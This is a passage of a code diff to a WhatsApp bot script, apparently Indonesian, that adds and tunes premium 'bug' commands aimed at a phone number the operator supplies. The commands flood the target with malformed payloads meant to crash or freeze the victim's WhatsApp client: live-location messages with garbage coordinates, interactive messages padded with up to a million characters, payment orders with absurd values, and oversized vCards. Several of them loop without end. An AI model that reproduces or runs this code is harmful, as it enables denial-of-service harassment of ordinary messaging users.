 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
 let target = bijipler + '@s.whatsapp.net'
 await joreply(mess.bugrespon)
-for (let j = 0; j < 30; j++) {
+for (let j = 0; j < 5; j++) {
+await ngeloc(target, force)
 await penghitaman(target, force2)
 await ngeloc(target, force)
 await penghitaman(target, force2)
@@ -12028,11 +12459,11 @@ await ngeloc(target, force)
 await penghitaman(target, force2)
 await ngeloc(target, force)
 }
-joreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
+await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
-case 'fatal-notif': case 'fatal-ui': case 'crash-total': case 'forces-sql': {
+case 'forces-sql': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
@@ -12065,7 +12496,7 @@ await bakdok(target, force)
 await ngeloc(target, force)
 await bakdok(target, force)
 }
-joreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
+await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -12076,7 +12507,7 @@ let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
 let target = bijipler + '@s.whatsapp.net'
 await joreply(mess.bugrespon)
-for (let j = 0; j < 50; j++) {
+for (let j = 0; j < 30; j++) {
 await ngeloc(target, m)
 await ngeloc(target, m)
 await ngeloc(target, m)
@@ -12113,18 +12544,38 @@ await ngeloc(target, m)
 await ngeloc(target, m)
 await ngeloc(target, m)
 }
-joreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
+await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
-case 'bug-rom': case 'restart-ui': {
+case 'starforce': case 'forcesql': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
 let target = bijipler + '@s.whatsapp.net'
 await joreply(mess.bugrespon)
-for (let j = 0; j < 30; j++) {
+for (let j = 0; j < 40; j++) {
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
 await ngeloc(target, force)
 await ngeloc(target, force)
 await ngeloc(target, force)
@@ -12146,11 +12597,11 @@ await ngeloc(target, force)
 await ngeloc(target, force)
 await ngeloc(target, force)
 }
-joreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
+await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
-case 'virg4m': case 'bijibapakkau': {
+case 'virg4m': case 'big-row': case 'idnull': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
@@ -12177,23 +12628,112 @@ await pirgam(target, ryobug)
 await ngeloc(target, force)
 await pirgam(target, ryobug)
 }
-joreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
+await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
-case 'sipilist': case '1hit': case 'mimir': case '1shoot': {
+case 'sipilist': case '1hit': case 'pucuk-ubi': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
 let target = bijipler + '@s.whatsapp.net'
 await joreply(mess.bugrespon)
-for (let j = 0; j < 5; j++) {
+for (let j = 0; j < 1; j++) {
 await baklis(target, ryobug)
 await ngeloc(target, force)
 await pirgam(target, ryobug)
+await ngeloc(target, force)
+await penghitaman(target, force2)
+await ngeloc(target, force)
 }
-joreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
+await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+}
+break
+//=================================================//
+case '❗': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
+let target = bijipler + '@s.whatsapp.net'
+await joreply(mess.bugrespon)
+for (let j = 0; j < 2; j++) {
+await penghitaman(target, force2)
+await ngeloc(target, force)
+await penghitaman(target, force2)
+await ngeloc(target, force)
+await penghitaman(target, force2)
+await ngeloc(target, m)
+await penghitaman(target, force2)
+await ngeloc(target, m)
+await ngeloc(target, force)
+await penghitaman(target, force2)
+await ngeloc(target, m)
+}
+await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+}
+break
+//=================================================//
+case '💔': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
+let target = bijipler + '@s.whatsapp.net'
+await joreply(mess.bugrespon)
+for (let j = 0; j < 2; j++) {
+await ryozingod.relayMessage(target, { viewOnceMessage: { message: { "interactiveMessage": { "header": { "hasMediaAttachment": true, "jpegThumbnail": fs.readFileSync(`./media/overpix.png`).toString('base64') }, "nativeFlowMessage": { "buttons": [{ "name": "review_and_pay", "buttonParamsJson": JSON.stringify({ "currency": "IDR", "total_amount": { "value": 49981399788, "offset": 100 }, "reference_id": "4OON4PX3FFJ", "type": "physical-goods", "order": { "status": "payment_requested", "subtotal": { "value": 49069994400, "offset": 100 }, "tax": { "value": 490699944, "offset": 100 }, "discount": { "value": 485792999999, "offset": 100 }, "shipping": { "value": 48999999900, "offset": 100 }, "order_type": "ORDER", "items": [{ "retailer_id": "7842674605763435", "product_id": "7842674605763435", "name": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑", "amount": { "value": 9999900, "offset": 100 }, "quantity": 7 }, { "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8", "name": "", "amount": { "value": 999999900, "offset": 100 }, "quantity": 49 }] }, "native_payment_methods": [] }) }] } } } } }, { participant: { jid: target } })
+await ngeloc(target, force)
+await ryozingod.relayMessage(target, { viewOnceMessage: { message: { "interactiveMessage": { "header": { "hasMediaAttachment": true, "jpegThumbnail": fs.readFileSync(`./media/overpix.png`).toString('base64') }, "nativeFlowMessage": { "buttons": [{ "name": "review_and_pay", "buttonParamsJson": JSON.stringify({ "currency": "IDR", "total_amount": { "value": 49981399788, "offset": 100 }, "reference_id": "4OON4PX3FFJ", "type": "physical-goods", "order": { "status": "payment_requested", "subtotal": { "value": 49069994400, "offset": 100 }, "tax": { "value": 490699944, "offset": 100 }, "discount": { "value": 485792999999, "offset": 100 }, "shipping": { "value": 48999999900, "offset": 100 }, "order_type": "ORDER", "items": [{ "retailer_id": "7842674605763435", "product_id": "7842674605763435", "name": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑", "amount": { "value": 9999900, "offset": 100 }, "quantity": 7 }, { "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8", "name": "", "amount": { "value": 999999900, "offset": 100 }, "quantity": 49 }] }, "native_payment_methods": [] }) }] } } } } }, { participant: { jid: target } })
+await ngeloc(target, force)
+await ryozingod.relayMessage(target, { viewOnceMessage: { message: { "interactiveMessage": { "header": { "hasMediaAttachment": true, "jpegThumbnail": fs.readFileSync(`./media/overpix.png`).toString('base64') }, "nativeFlowMessage": { "buttons": [{ "name": "review_and_pay", "buttonParamsJson": JSON.stringify({ "currency": "IDR", "total_amount": { "value": 49981399788, "offset": 100 }, "reference_id": "4OON4PX3FFJ", "type": "physical-goods", "order": { "status": "payment_requested", "subtotal": { "value": 49069994400, "offset": 100 }, "tax": { "value": 490699944, "offset": 100 }, "discount": { "value": 485792999999, "offset": 100 }, "shipping": { "value": 48999999900, "offset": 100 }, "order_type": "ORDER", "items": [{ "retailer_id": "7842674605763435", "product_id": "7842674605763435", "name": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑", "amount": { "value": 9999900, "offset": 100 }, "quantity": 7 }, { "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8", "name": "", "amount": { "value": 999999900, "offset": 100 }, "quantity": 49 }] }, "native_payment_methods": [] }) }] } } } } }, { participant: { jid: target } })
+await ngeloc(target, force)
+}
+await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+}
+break
+//=================================================//
+case 'crash-24j': case 'bug-24j': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
+let target = bijipler + '@s.whatsapp.net'
+await joreply(mess.bugrespon)
+for (;;) {
+await ngeloc(target, force)
+await baklis(target, ryobug)
+await ngeloc(target, force)
+await sleep(120000)
+}
+}
+break
+//=================================================//
+case 'samsung-24j': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
+let target = bijipler + '@s.whatsapp.net'
+await joreply(mess.bugrespon)
+  for (;;) {
+    await ngeloc(target, ryobug)
+  }
+}
+break
+//=================================================//
+case 'ios24j': case 'vios-unli': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
+await joreply(mess.bugrespon)
+let target = bijipler + '@s.whatsapp.net'
+  for (;;) {
+    await aipong(target)
+    await sleep(1200)
+  }
 }
 break
 //=================================================//
@@ -12240,7 +12780,7 @@ message: {
       "buttons": [
         {
           "name": "cta_url",
-          "buttonParamsJson": "{ display_text : '⿻𝕾𝖕𝖎𝖉𝖊𝖗🕸️𝖂𝖊𝖇🕷️⿻', url : , merchant_url :  }"
+          "buttonParamsJson": "{ display_text : '⿻𝐙͢𝐱𝐕⿻', url : , merchant_url :  }"
         }
       ],
       "messageParamsJson": " ".repeat(1000000)
@@ -12252,7 +12792,7 @@ message: {
 await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
 await sleep(700)
 }
-joreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
+joreply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -12279,7 +12819,7 @@ message: {
       "buttons": [
         {
           "name": "cta_url",
-          "buttonParamsJson": "{ display_text : '⿻𝕾𝖕𝖎𝖉𝖊𝖗🕸️𝖂𝖊𝖇🕷️⿻', url : , merchant_url :  }"
+          "buttonParamsJson": "{ display_text : '⿻𝐙͢𝐱𝐕⿻', url : , merchant_url :  }"
         }
       ],
       "messageParamsJson": " ".repeat(1000000)
@@ -12291,7 +12831,7 @@ message: {
 await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
 await sleep(700)
 }
-joreply(`👤 Succes Send Bug Ke ${target} Menggunakan Bug ${command}. Jangan Lupa Jeda 2 Menit Agar Bot Tidak Rawan Ban🩸`)
+joreply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
 }
 break
 //=================================================//
@@ -12630,6 +13170,44 @@ await ryozingod.sendVideoAsSticker(m.chat, mengkece, force, { packname: 'Zero Ex
 }
 break
 
+case 'dott': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 1`)
+async function pe() {
+const bruh = {
+	key: {
+		remoteJid: '',
+		fromMe: false, 
+		participant: '0@s.whatsapp.net'
+	},
+    message: {
+        paymentInviteMessage: {
+            serviceType: 1,
+            expiryTimestamp: 2
+        }
+    }
+}
+for (let j = 0; j < 10; j++) {
+await ryozingod.sendMessage(m.chat, { text: `thezetsuboxygen` }, { quoted: bruh })
+await ryozingod.sendMessage(m.chat, { text: `thezetsuboxygen` }, { quoted: bruh })
+await sleep(500)
+}
+}
+
+pe()
+}
+break
+
+
+case 'nativtes': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 1`)
+for (let j = 0; j < q; j++) {
+await ryozingod.relayMessage(m.chat, { viewOnceMessage: { message: { "interactiveMessage": { "header": { "hasMediaAttachment": true, "jpegThumbnail": fs.readFileSync(`./media/latx.png`)}, "nativeFlowMessage": { "buttons": [{ "name": "review_and_pay", "buttonParamsJson": JSON.stringify({ "currency": "IDR", "total_amount": { "value": 49981399788, "offset": 100 }, "reference_id": "4OON4PX3FFJ", "type": "physical-goods", "order": { "status": "payment_requested", "subtotal": { "value": 49069994400, "offset": 100 }, "tax": { "value": 490699944, "offset": 100 }, "discount": { "value": 485792999999, "offset": 100 }, "shipping": { "value": 48999999900, "offset": 100 }, "order_type": "ORDER", "items": [{ "retailer_id": "7842674605763435", "product_id": "7842674605763435", "name": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑"+"ꦾ".repeat(30000), "amount": { "value": 9999900, "offset": 100 }, "quantity": 7 }, { "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8", "name": "", "amount": { "value": 999999900, "offset": 100 }, "quantity": 49 }] }, "native_payment_methods": [] }) }] } } } } }, { participant: { jid: m.chat } })
+}
+}
+break
+
 case 'bugpenis': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 1`)
@@ -12642,7 +13220,55 @@ message: {
     "degreesLongitude": "p",
     "caption": `#ryozingod-2k24 🤠`,
     "sequenceNumber": "0",
-    "jpegThumbnail": mengkece
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: force })
+await ryozingod.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
+}
+await joreply('✅Succes')
+}
+break
+//=================================================//
+case 'bugtayo': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 1`)
+for (let j = 0; j < q; j++) {
+var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
+    "degreesLongitude": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
+    "caption": `🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑`,
+    "sequenceNumber": "9",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: m })
+await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
+await sleep(200)
+}
+await joreply('✅Succes')
+}
+break
+//=================================================//
+case 'plerku': case 'bug-gc': {
+if (!isPremium) return joreply(mess.premium)
+if (!m.isGroup) return m.reply('Only In Group')
+if (!q) return joreply(`Penggunaan .${command} 1`)
+for (let j = 0; j < q; j++) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
      }
   }
 }
@@ -12653,24 +13279,59 @@ await joreply('✅Succes')
 }
 break
 //=================================================//
-case 'bugpepek': {
+case 'bijiloe': {
 if (!isPremium) return joreply(mess.premium)
-if (!q) return joreply(`Penggunaan .${command} 1`)
-for (let j = 0; j < q; j++) {
+if (!q) return joreply(`Penggunaan .${command} 6287392784527|1`)
+let ppek = q.split("|")[0]
+let bijipler = ppek.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
+let target = bijipler+"@s.whatsapp.net"
+let jumlah = q.split("|")[1]
+joreply(mess.bugrespon)
+for (let j = 0; j < jumlah; j++) {
 var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 viewOnceMessage: {
 message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(30000),
+    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
   }
 }
-}), { userJid: m.chat, quoted: m })
-await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
+}), { userJid: target, quoted: m })
+await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
+}
+await joreply('✅Succes')
+}
+break
+//=================================================//
+case 'ajimale': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 6287392784527|1`)
+let ppek = q.split("|")[0]
+let bijipler = ppek.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
+let target = bijipler+"@s.whatsapp.net"
+let jumlah = q.split("|")[1]
+joreply(mess.bugrespon)
+for (let j = 0; j < jumlah; j++) {
+var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: target, quoted: force })
+await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
 }
 await joreply('✅Succes')
 }
@@ -12680,9 +13341,86 @@ case 'null-chace': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 1`)
 for (let j = 0; j < q; j++) {
-ngeloc(m.chat, force2)
+ngeloc(m.chat, force)
 }
 await joreply('✅Succes')
+}
+break
+//=================================================//
+case 'senggol': case 'zxv1': case 'zxv2': case 'zxv3': {
+if (m.isGroup) return joreply("Only In Private Chat")
+if (!isPremium) return 
+for (let j = 0; j < 5; j++) {
+await ngeloc(m.chat, force)
+}
+await ryozingod.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: ['00000@s.whatsapp.net'],
+externalAdReply: {
+showAdAttribution: false,
+renderLargerThumbnail: false,
+jpegThumbnail: fakejpg,
+title: `⦃ ••• ⦄ ⦃| thezetsuboxygen |⦄ ⦃ ••• ⦄`,
+body: `⁗ ⋄ mati aja lu suki 😂`,
+previewType: "VIDEO",
+sourceUrl: `༑ 𝐩𝟎𝐢𝐧𝐭𝐬 ★ 𝐳𝐞𝐭𝐬𝐮𝐛𝐨𝐱𝐲𝐠𝐞𝐧 #𝐳𝐱𝐯 ⿻`,
+mediaType: 1,
+mediaUrl: `${global.url}`
+}
+},
+text: '<★> Stm Kapal Karam ni bos\n<!#- siap membantai suki liar\n\n#senggoldong'
+}, {
+quoted: m
+})
+}
+break
+//=================================================//
+case 'costs': {
+if (!isPremium) return 
+let penis = "𑈶".repeat(50000)
+let msg = {
+  viewOnceMessage: {
+    message: {
+      interactiveMessage: {
+        header: {
+          title: "",
+        },
+        body: {
+          text: "🔥⃟༑𝐂𝐎𝐒𝐓𝐒༑⃟🧐⃟ ⟩ 𝐛𝐲 𝐳𝐞𝐭𝐬𝐮𝐛𝐨𝐱𝐲𝐠𝐞𝐧 ☆ >"
+        },
+        footer: {
+          text: "https://lol.zetsuboxygen.ml/costs"
+        },
+        nativeFlowMessage: {
+          buttons: [
+            {
+              name: "single_select",
+              buttonParamsJson: `{"title":"▾ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾","sections":[{"title":"🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑ #${penis}","rows":[{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"}]}]}`
+            }
+          ],
+          messageParamsJson: ""
+        }
+      }
+    }
+  }
+};
+for (let j = 0; j < 10; j++) {
+await ryozingod.relayMessage(m.chat, msg, {})
+await sleep(1000)
+}
+}
+break
+//=================================================//
+case 'prikitiw': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Penggunaan .${command} 6287392784527`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
+let target = bijipler + '@s.whatsapp.net'
+  for (let j = 10; j < q; j++) {
+    await ngeloc(target, ryobug)
+  }
+ await joreply('✅Succes')
 }
 break
 //=================================================//
@@ -12690,30 +13428,56 @@ case 'bgtes2': {
 if (!isPremium) return joreply(mess.premium)
 if (!q) return joreply(`Penggunaan .${command} 1`)
 for (let j = 0; j < q; j++) {
-ryozingod.relayMessage(m.chat, {
-    interactiveMessage: {
-      header: {
-        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
-        hasMediaAttachment: false,
-        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: ryozingod.waUploadToServer }))
-      },
-      body: {
-        text: ""
-      },
-      footer: {
-        text: "›          #ryozingoddominate"
-      },
-      nativeFlowMessage: {
-        messageParamsJson: ""//" ".repeat(550000)
-      }
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
+message: {
+  "interactiveMessage": {
+    "header": {
+      "title": "",
+      "subtitle": " "
+    },
+    "body": {
+      "text": "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
+    },
+    "footer": {
+      "text": "›          #ryozingoddominate"
+    },
+    "nativeFlowMessage": {
+      "buttons": [
+        {
+          "name": "cta_url",
+          "buttonParamsJson": "{ display_text : '⿻𝐙͢𝐱𝐕⿻', url : , merchant_url :  }"
+        }
+      ],
+      "messageParamsJson": " ".repeat(900000)
     }
-  }, { quoted: force })
+  }
+}
+}
+}), { userJid: m.chat, quoted: ryobug })
+await ryozingod.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
+await sleep(700)
 }
 }
 break
 //=================================================//
-
+case 'vcard-int': {
+if (!isPremium) return m.reply('Khusus Ryo Ganteng')
+let txt = "ྫྷ".repeat(15000)
+  for (let i = 0; i < 80; i++) {
+    var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+      "contactMessage": {
+        "displayName": "🏆༘྅͜͡𝐙𝐞͢𝐭𝐬𝐮𝐛𝐨͢𝐗𝐠 - 𝚺͢𝐳 𝐂𝐫𝐚͢𝐬𝐡 ⿻☆"+txt,
+        "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;🏆༘྅͜͡𝐙𝐞͢𝐭𝐬𝐮𝐛𝐨͢𝐗𝐠 - 𝚺͢𝐳 𝐂𝐫𝐚͢𝐬𝐡 ⿻☆${txt};;\nFN:🏆༘྅͜͡𝐙𝐞͢𝐭𝐬𝐮𝐛𝐨͢𝐗𝐠 - 𝚺͢𝐳 𝐂𝐫𝐚͢𝐬𝐡 ⿻☆${txt}\nORG:🎩 𝐙͢.𝐱.𝐕 ⿻ 𝐕𝐢𝐒͢𝐢𝚹𝐍 🖤\nTITLE:\nitem1.TEL;waid=6281299999999: 62 812-9999-9999\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:🏆༘྅͜͡𝐙𝐞͢𝐭𝐬𝐮𝐛𝐨͢𝐗𝐠 - 𝚺͢𝐳 𝐂𝐫𝐚͢𝐬𝐡 ⿻☆\nEND:VCARD`
+      }
+    }), { userJid: m.chat, quoted: dust });
+    await ryozingod.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id });
+  }
+}
+await m.reply('ajimale')
+break
+//=================================================//
 default:
+}
 if (budy.startsWith('=>')) {
 if (!isDeveloper) return joreply(mess.owner)
 function Return(sul) {
